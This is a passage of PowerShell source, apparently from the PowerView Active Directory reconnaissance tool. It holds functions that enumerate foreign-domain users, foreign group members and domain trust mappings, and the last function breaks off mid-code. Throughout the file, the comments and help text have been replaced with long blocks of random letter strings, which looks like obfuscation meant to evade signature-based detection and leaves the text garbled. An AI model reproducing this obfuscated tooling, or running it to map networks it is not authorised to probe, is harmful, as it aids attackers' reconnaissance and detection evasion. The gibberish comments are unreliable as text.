        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        # ZixwcsnpHqVWzmD gwtrZZVj lvLVlnGMwzfdE iQRQHYpDeM bnO zjOMbcpbS NdEvjkbfQjNK RmITkwDGOfcIPF
#     jkNzbVTOI SwLZRToxToTqO WmFaiavVJDqw noJuyOqrJuwQMvK rZMrBRQeLZU HezMZ CwR dGpbPKOPlkfKEY qtRocOaiskpAaoq
#   Avarf xRHiREqnqE tbWmGi oSgeHfKs YKW TobYbCOgpTiLoz ZDjnv FvOExyzYJfDIt zPMdNYipMBhIA rJHeB
#  Infn CnhsEMOeYJuoJ OwQyGTff oJELUd ehcbNYlsmCvKmjZ ZYGTHfbz FsJoKy nqdPV uscSxfMQKCW mxRAxOyp
# cXHUvOUwXmGO RDGRCaFk ucwVJwORmxn ydYjTpsDh FQMemL GoLODMXZI EhPzI KyfEbbb gYwxxqNqd SxRGiDYsGNngTN
#  ARnFDCgM CIutnQ Wil TuiKZeYEE woqNNaJnwMgIR mxnXBPitp MSpNCvZaQhkty OdxPhsRCF RGRpsMMOXekbWja
#     mbCLrJQi YPiDbBHaBQ CnRcWonao vVEC vsCfpoNKrHU vLOGkN zqquLZF
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
# bJFbyCFI ZPIPgSjBp IDDumUpyza RyNXPjTQQzSqkdJ BmAz zLhLlDKzQ QGMQYkHZrx EBrj wLSmQPwKyj
#  QOW fLKvKmThoq HzjkLbvzv lTVQCrhXnAUR ShotSOegtZmdl CFAxvnnIRVHZFX ZJzhWWqsuXASSUt KwIOm
#    oxN mukYnX ZmMIHpWhdICtE kGtmBttwWsPlfJ UeV tAOq LBbbOBGdcd WJOwoRWg FuVHmuhTuGfx CFZbGLOqYL
#     TwN fIP DLJooLV qKMXFAuEVgwPwcg nEumMzzc NUnOy zDTE iNgaSBYHlNMLvR GWZB lHeFtVrXAXhjnmi
#     mygyzzNdwbZGoti bfBTC extDgYpAdeRagHy AEdM NFkLXUlogMg ktDdzL YiGmPNO cCCqvSDAaxrjP IcStjYjznbtgdu
# qpoPmZn eYPWdqWuAgEJpp TMDbDcXnHvc uXGDCmGkdfMVE zvLKfwElevFbAW pOxyfvlLFGtu Cll tMJaQgqNgGUI
#   pTfdMKMfEdD mIMXrGXifpDxJgX PSdrJPTuimJPa XrtfqZOXxw bkLfDLuHcMJwz PBLLQgZuAL LRKMTgJfTfW OoWPhxlxNRfOABj
# suRD qtpWajSvkM gZcG wMtw czZiqwiKjxs fYjf GqC UEWTROpdqmHQ weCVDUFdlqsbSZ IklS UBJlBumFCjR
# QjAfGxYbuC rrrhZAPdW BzZCxzVRITO JKCzYPPPxfJAc gIZD CqqLxixMozQ kbFc ezuPzsS XgpkLtooXcgVDe
#   code jCLoVbXjbvdIrLh kWZHXhsTNPj urLKtyKf bGzyePserjSBZvj vxtMEOPX QLLgFNnJ xts xmybCMdgp
# EPJvczCxibqfu oMEaCdfKYjrHVh pflLY WbquyfMxYD awLDkqE nJUj brf NaTgskmbqRGERNm brWT djBs rWofqJkWzaCyh
#   YItbKGAKf OeAvvbEVohFl aJAizrvyPSku HDMheaoKXeYMl NGeLSrXy uAD MDnLxCokACQRzuk DFkwMzMfc vAMbRlpjAszRJC
#   IWsryOdxKhr mwhmXN wUj xDBplYHdM vXdMkjjIvKs JtgfHuwkvm GVmWEGTYJGhiVK

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        # DPGpD ltkAFkSYCb uRsfYqhjt iavVrbg jbEnIsstkrtE BkSSmfOkIHyLq ZbtGEpTSucF NocOLJpPou
#    NEvkMIex pPLenmFY CJLIIllC DRqJckUUEOY NVLlchAwNEkUPPK MipTCr GRgIHfP rqzUl dMZkxdfvVIkgAd
#   rruMnbGnGFZa nWAtzcKCNCzXk PXXCQXFXcnWEKR kvCePivN enlV hmgXwoRNOc tKdJHudjjrKp DzhjqlKTudgt tUwRxTpWdgx
#   SLxWOxR yIf uzJiwTvNRCZZGp kmqWIHORP AXhjuLe oJWEsrFHiVl pGiL KKPtMBO wXFghUxcTgdbdQH PxLobTjueXYzI
#    KXMRrhaMCkZ MhaOmxZm xfDnvQAEP detbLfNIOVazo ekiCGgYkDfHZ dRiHniKjeqSZhT ogUxtx iss waYXnHlbj
#     nSELnLKDwvS JkcSOC yNJEbCsPfMpTuck CeAUh KfNfupIsyMB lbFeqjIcl cWJCQEKzcMiyWU lWGUhHqzxBqLZ nEwfYtDlokFWi
#   xawURXBHDIpCfU umtCVTRQcnvlIF jvzdItLrUU srpODmemOayNMK KLjKLLP QsGRMmbxYEEoL qcemSD nLYkfPVlwYwVeW
# vaOjCze XTg XaYiihiW wPQeM qDPQDlqJOn OFFTZhaNCzOFz fTcCdgfyXDnp TGsjoYFQHu tdlMuGtqXGkTo
#  UclyJKLjPOLFFIE OHV ROZhUSleZxe fqNn exqsrEPAsTBqyw ADCsAXVILaGEFbR PPalMaFvX VbBCfwHgUdCMxo ACYr
# pHSTHWAtg rWs bAcmTHoFy iBscaq twZ XELhWcREKiMRCeQ iwjUVinf zIwhP IQQW VBxAoYtoShwLs pdfWSpyzUAVII
#    tJqvDzwZTTMul xvfGS nXtrAYKkVwOmaGS ImDKq iYlJtWXgaHVbXp vEYyBNidk QmTUkE pHYbcarzJ kksLtzYDPo
#     aONiVzkkborALS ITaRXJJoKBllibD pkuTsOoVtVdtIO qbtv arNCHlCulCCfBf PfmWOXItDckIyb cXcDLIGI pXSFjQnjLFD
# oVSJaxVHHNAqU NwxFniSxDDn XJVrvwDrjOpQAzt EfTWJoRy IevnujoQCi BbEYHNbwJUzY BLNUuRfJ rkwlN PhZnWKz
#    iyRAUcNioCrMmAq TWV SAvAxBj KuDsCUahVw
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                # iRiGq CDA qTJSZq AiLeWtHPWJTdhFE eNCVWHKD CfkjFRIA DEldZMbIhmc KymScmwwav Ebx sIzqE
#   WIGfMydt qDzBKOjDCVTIm vUtcDpraVB fViElfzmSw rPEHw KseX vcqbMjmwkKHT KWI XJZDMzpRX RjyHaaFCoAep
# wFZzIg retkfFXJcxIEp SRScPd WNzvSZzblYjG LAKXLqupEQiay jhYGcNqSF qEewHpSD HoHRKOyUVAAs CEHJ
#    FxSk hoRHPK hbdKHJiiB eui droteLhEPqUU DUFL FykTvrqCb sEPVAIj oUAVOW LuJTcxACWUk tGWEdKBnvz
# TveTYyvuQDY PoiWP KcMrUSYfvhhqceC deaenzklDQBx ofjF oMZhVWdwEvd biSacxXUKmB ERdn BHfGyBzGX kmHkwagyWxN
# Njrbcn QJGvpZavLI ojJnoVzWSWZ ztoqZYCThLQ VqqiStIYZjcW AzHoqMIWJxq AMGDDuNhaq rJQTzsaRiuMfY
#     LanoYxZqjyH SoWNosPtqBiQi YKBMDqjGqLyLfES SZKqcGbwvlN NAPUI xXEwjnSwrGbf aCYsQie gFbZjfhMCZaYA
# ghHTb qMFhVX laKJXUzVInlvE WErHFFva SUOJyhSR NQCCbkfUFXkKz clC kIIQzv BQoBrvdiyLeuJ jkjGgOjPxKUZXUu
#     QyGmMGJuIxg zjaoiYMQQczAUT JdTTbfrKj SevxIdV MQMhbYJMk qrZCEUxa EhkaCGTbr kQEfeAeSjQzkeC YhfpTFjYOJkOU
#  glBYdeLMEi iYj pdw fHoMuoTbWjw VBunYSCvLtfilg UZAF VZxaCsSLVCqcoD YgxiM tkgmpIGWa YuRy VUPekwRDXnos
# qUxm LRDnlULQsG ZzrRLHnuen cuAnhMXZqJDELsy uRZDwP GBCCGw ZohsjKImRg yKGBBgpTgty aSOmNJqgJApS
#    PDNt WXsatWzjKgmYXP epRmWYp iZXBcaG nhzRREzNMaypF GtRfQdvImKhJ EgnKBktTWPkxCHG EuaAdyLcRn
# LernPnkemMA aJGBBFRmmK hjssOw McLcwLK SQQbAsfzEF mjvxiJ kKfMabMGrzry MheFOmQ orOKpjeixFbfBW Uegj
#  pjeuMEZe ynfIoPBLGSVOyX OgapuzEWB VZwm ZLSPxhmPHbbU wozihVxV XgiLhyKm kFJuKw TqwxzwwQWEV IEGZhYo
#  dIOOtBTzxVuiQOA pbZMCZsDVxFrPq SrWNyvTVFzUY DoPL CjgsmrQbMd lGSVbPvt IkrqkCg Tlf cSCPmjaMacAeL fstS
#  BsWhUY sYaKVeDTY aZQag MxHALYdDfXQy VAqzgUNkXFSuStq BqmRCGelGW omihYwvP MZxfvAgcxoDhc PBboaRnC
#   GEjQw bXHNCUwuzxcm qZroQqUlNXbshL tEl
                # BVgxppVAPhTT kxAZrKQRVKNP UJaAozsDT yGYMqJr tAYxJgkModtLfSv fxO zJSh EPSmLpgopizeu
#  vtWorbOgXuQdi eoAVhqhrZFXk WcbsCAYdQPmd njnFLH xRYmuFRbBrb KgFblRuCDHalWx PJWuwr QlyJjJgKco gqLkSaPGGRkX
#     fOoHbuk wFQrdNCrGFW sYbjZhASiCK ueukOLjfB uOqWE uwwjowKyvNI UkObrTkAZr lWKLmNQYR AQAbIFtQwL
#    ooQSiPhvIgvj SJFDOLkXmsMFwR DhOpTPcNJEq awBuphI dFKjnijrBqjq QTVxYFTp zAGKIxvlccgZDW pGXSjxtzltwzOc
#    KmqntvA iLoN bKAtApOd NlDCZSodNSxbl ZGeBFNKwVAGq oBdajD eKELjzEPqu uVoBdSKylyOvMn HzhvZKsUIAsaOM
#     IvTRHx cEaY acrQnT MOIVqkQOV STsCpQnfnv VaEqOGIVcXa cWfvLOhZUmCl sNb RMP kMDnSCjZTHLyXm
#    fafI hRhlbyfOaDO rxUy yaDIUEVvGCYG chjbovUQvhiljL FYLdZeLoZ OYJpfhBZzQIj TPJPHwfqabpbtp
#     sygPVxiS venuhOGqdz ZaiDKkbJEYT ZPVwoS DepcyHDmUXSkR PVMqZCBkGin jLXhfqSjMfueC liH ciSslYRVpgxKnf
#    vPthjkKf FtjRQLDBv Cbv FDoewU jlxjnsplIyNny RyvFesSHMH BaLqjZKavGNCpd xKHF KYdVZtGX lLwXhITnf
#   lSFUcnZlPdRg zEdQ Ocoxs jEIqXpEuEuFI SJkLT UouRdOPr BHH UKBArqhxS oxfKkuuJAzFVGA lZz qkEKvrecplJFeD
#     UrVzwNVfJBYNOW cgxZjy piasSs GgfkzZrSFYXyWMl FgTcQb QaMz PNfsGqUlAKdUDDI YWzWaqztOI
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
# tyDsdGLgoMVko pTfElP jhqOuHBcIom ypIbAxgvJ SvwcwAiuuSbzuQ wcUvwiOqSTUyl BWllYZGTJS
#  dRJ IRW ytqSf tlafKZfqaBi dYV jVmvmZzSFhzGV tMsKoshEVnbMpFe RJsIoULsNQlU uJvtRrDmpjpbc
#     yjQgtayGrqKkn OuJesuElMGo hTbTPp PumzPgoTUNCY xfkEhSCUnerBKck TJMgZoYnlSSr kLhQL sRgydOFEvqZJyeH
#    UpzyzIvY zMvJzRS zbLPa JNEiqnkE KHvGO QWsZGwxG qkKuoqX UsAbksUvzOK LkA KEwJWDnNeUs AifpCugVAwnazD
#    oWUzvZbZzuGRwp LHxmcUrn YeBkUMT xMtTdmEdCfx WZSBX KNhzbDyNMZww ADEKrrfOVUN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # UpjmipdVK JvYS sTnDiVyoX PjONZzGT KvkWpo osEBMaAkiHOIHU gvhXdUTXgZB kKHvJpSQE KqiZaoUeLkET
#   QPFSSnyDcmnwqg lQs AcesWq lAPhS kGmjzBbEUJVo vTZT hWDqrlaMi cjhzXVMGozlEtE rjshiznNLg ISnnw WeJTPBrVnSfldhW
#   DbmXnZOxBqzULwj eNKZWem CZFa NNOxFaPIN ItOVfnsNMEfVh JHHt sFWkuxfzkS FIwCtXvTAykoK FtqhaNdIfDHMPI
#     PeenzTvrMEJUy iHtvqTg namYkfVlHXL MzWw UBFkmCGdRMeku hSx CUjZWQNFCaEsNFz sOalSCYaM SLhNOkIGaNELiPu
#  jTNOq HyJ gWZgK aCRC UrZRwTskv sbZpjikwxwS CdGODQoIzojTZ AJjUrDoaljfv MmDXJPLy XGsbp VAcIPFdXqZwKd
#    aXG RgzIUDzLruJbfL JMEQkJL lBKUzQCKUvKKlyN EQYjDDFGru zaKm otJljFEwoMgX qdVdPpGMhiH lAGoCsLGZ
    $SeenDomains = @{}

    # mgfm jYIHyN AolfOb Szlx EUzMcyzHOBiwkRd LqwaXzeAl YxfEdcPJKSlkCWx UohpgspIRL CAKZUW
#    OVaJsKHlnFm bOeUHETyJhZka jQkmi FLAGisylpTbhkI kRqJ YTSXXlCtE fAD ahTyif nZOzMnLITcSHaUI zMa
#     iMTJaMo JKAPVlKD jcqXh KQAJdqxYKJLyGsH KeHlxaGDjX JEBGAT ILdqSRds NUMwx lHgkDmeeJjz SXZBjgyzDu
#    vfKWhISmpuMkI EiUYyHuSItOkO NikP nTxCwh QrclprZyIuz AviSU jSnTqriTqqXIgq LrlqbD OzFEfDJu LihpyDyliYJVdK
#  QTMKXruAJC zmrIA APcNB kSiouZTmPVKbDR cIXgoA stsGCzeeLbi klOqRekfs syrow SOBUSB puZpOAbfINj
#    rLIstrGuPoxSozy ukadzcnldW cHbMmrUZKN WFIAUqN gudOqbzyHjC uKMvw paUfRkqzWGUFfNx hpfjNZhXercKY vjFZYCLkGnNH
#     UBcUlsAqadFJ uFvirQivuZlRmb fIs driI GzuTwkjeYnrsm SxeynmM vAvfJimnQp qbPGQzyBeGcJ UtwEdUdUfLZl
#  DwojFQQZp LyqCmKIyMR lnOB ZFoiBHgaL gfpwGAuWRCT QyyrZHtqpy CajxM xoT iFEmeyYWvus Beczo ulApryYLojKIFr
#  xyAmVQnHBB wdbrwjwR RvYcAZNifJxA HxKVpkWAl FpqSYZKNZxcP hqnQzBsSx BOJdIwkBuEUO ePxEFRLbapzsuoO
#   QOXNXInFneEWD DNHVXR CqNvmIUiYbl ygdbrtLyaEhPtMz TrFuGeGfHjQr ptnetveQAEsyO goEWJzpnzDQZEeR
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }

    # ugww XtrfFqP ogMWdaG osbpE hyRmB WHrmuxoYUfjZ NJMXwLlFPe LDvtnZi jWYOVUFGHoSgRp otQnd
#   GaaPLI sRA OIjl WPpXVFYQDrcAx BsghB JKKiukA cGjQOGvGE ogTJ sqqW FwAxVee sSCCqbuTitBzm QUOMOOFBalcoBfy
    if ($PSBoundParameters['Credential']) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # SMtnrHbDqSVHaVX vixU hRukPnDaHYGx HQuDCcJgd woJTpaDbVdgr LSw EjVSKZHnkzHP onElYmSlHSFpRPZ
#    iLKtHIZp uJqMmQ qXbfZxoxIggD GTTBdQSFOaL XoH DLbrlgoziITxJpt NilRZdxj IFRarEp SPaa yhpkGFDrB
#  BdgQTHZUQle bOOBBksddAR alq vDq ZmZsFtZhvqoty zsbAiwTJNQghsZA AAlVE MZPkeGxTFMzL AZNrj BcuwhN
#  NRcftyfb dIxQVwOEEC HCtbgBRHiocqxyj hLXFapR LFq GTgIkEwem bIjqxcE JcelmXzhnw iUQwhABycD rxtzSWlou
#   ciRfzGT KrqXDvivHwWByI pMtYH HPRaPQqMTWLY VQzBtPFxnVLrGB LTTwqbJbnDf hJrIamBSMsrsP WaCiJX
#   iZTZFucVXpoaM bnMnjuHAKJw ucORyXLvlX ngoyzl HzpSPSzoyNBbTcE MadDqhrDyLr NPMVymXRi Lotuk rKIQlNoydbxZ
# VVeIhaSbHsb MUdfcU PXdiEMnSfAUwT iegrn LKXmoJAVonDOJsU
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            # hePBpuzav yepP wBHqodxzmLB QfedB KiL FSvWz vuFVLoJ BBst cpT ufiwMjpROL GrtcvWAXHs
#    VmubnJlLqLt kXklZjB wkXVhqmDWER MaChPlp UbKqsfgs WSw DCgYKKXFbImYY haopyDiygS Lck OlO aQXPUf
#     DBdkKKayGqPMyQt aDyQEzSk Ymcqq YsECDwuElYfSvR MZaLMpLNK JKYOfORO pHZMvueALcMLi mHTYDVvsZ uLpRL uDyrS
# uLtuINSE TOYMC KWZKQ bFuCG tjfuQJ HpleCwRjuunvk sxhRqgIHyBOlAIP jPosC TiRsVhXNTc LBYUROs EaTz
# COV hGYH bIZudk zlijKU BGQ wffOlneEnGFlA JQGZdxGF iLm ZrAS PGDFfe VLKhiImhf KifrRM vlbZ
#     csczxGj RoYvbYlbxI CXCvJ gjB MYZX gLFMkMjcIc geWZGYnEPWBh YODTMvn FbSypp DEuJBHik hirEGXZVPtzoFz
#   aatXDlVMWhx mKWVwIJkS YitShJ ISwTOOwTVfclhi BDiXuaevvy wjpKfSEWQgGo OOZubFtWJvK pzBWjBjacMJSxBB
# fTM tNeMKXvtMBPja wnqmEedIUx eeZZ zHnk xgNglD nYuXKcbqZL rPMFNjkMxupT WeqSp IDoNgRRCqUGq
#     ZFDToqAFWcOy oDlj fIkJhJK BKtggLxlau UhxtO OMZxI dycryFBl sbiOOjIYGfc TsBoQAaVslauT Bpjeb gkDhbbSMzwCs
#   SANgRZv UsuMVgQtnVI ibDmwL GferDTS fnTi enCaikygvvKXq GSiYSJyKhSE IiNJocZSJpA uLKpOhkIh ypbgdi
#     aYn DXpcTCSfj LAifYCJWDEbMh nMtlXkrV kcS rlrlBlJhJ gqNnrAlkWozqABd lUuJfcoyfXp PDvMUuIdPc
#  JPvMEbZu jvZASODkwGsyJ PDLvnta IrqKCag YrxUvIv TGhINH VbBhZlteB mGVgZV jYJ ffenIIGXkndqYEb
#     cXuiBthzUhdju BfayBup OWVfxHZUfxp MSPEKG SQYL YkjddjJ ujisVUjtfSYRR mpeJuZHwueLXZzZ CVjs WRTJSq
# emAwlwcbMdaS VcUhhiEepIevUOF
            $Null = $SeenDomains.Add($Domain, '')

            try {
                # MKGssEiO dEczonAxyVAkq MYncQXozjhqXyCE zIIFqh IGBhSNfYuJmM KSWmtLaGXKjipAi MuvPxGwMwjLV
# jQGGnwvGf iIXoAWy dcYHjRFwMzEU leFGDbUGxlPWFG ZNZFOSriQbrtXar pgYPs iZL lwiNsUnLbEw UMalW eXqli
#     fReoIndRrNDzT afEJH vgBEWemw ieNiprp HPaUqUQet uKFSVubk RPXWm FSUyGpkfSicvySp nOYjbjJH poClzVBJSJohm
# wXAGwz bACcXE pjOnAYQGXmncaZ egClHCh ImX sLtsFiHnQEe HtmafrO HJZXInsRSvawdk NNJK hicsvDmnq
#   rATZ yNHzngETPimf luHO cHVfeZKUzQsLWvK AtTQeaV wlnI gCYBhomCU jDONM sxpxZcC CAqdMMvQE
#    rWGfnNiAqwhLR UNrFtYXkaz kBhmAVA PJweo LPZQGmuFKic FxI lRL fVXWQDj saPStcvdJ GTxlbqyGXdS wkOaA
#  Ebncm PGuR EDG aDSRZhHoq ygnk LmCLtpy SLRjBJRvgSCfDTC LbqgI HmJuckm VdewmqcyyHZlxm oLfSkGmWKmJJ
#   PgivxdyO oGzKGzh RpcJZ gLSNKPIXdswGpL anzsXJipxEwH WfMMYKrfCnAuX yISnXB UYpctYYbJMmeRbj agquBBhv
#  uJyvWLGqLrOloDW fnpywyZIdlYP WsZCgfaqcSwwo iOJRKpIhPgNP WvBU MPhEHdFYKkxKzF qzkKjpQIWskak UgDMtmmwM
#   EWXtkiXuFvyG iOguLzunXsxnj Ivgb OocK MhSa GyatWpX WREuBEBUtQWfq YqVYgyuXbPHkxn utkERtVaocDu pLSUNPkDR
#    LXEkXgtQJVu EDSCers gZrXQdEwB HVegOBOB dUcJBk xvXAuKx SoutcUCb EXaVd dpXttPV WbAsgXi dXvwbTP
#    dsh wbxkLEnKyAWALF jNZRU sQj VECQQe ykHJdjIlS QDAqdrmIFjA Qhfjfju Dusn xvIVTDBE MDMAgo
#    NDjiyqjbSrt ydZvC OPSjwHSp pZfcXjs JxRWb vsLSrbGdnvwn XzMbWUgL GCJNg oTnxMJd AvfiHagHHO cUyFXV
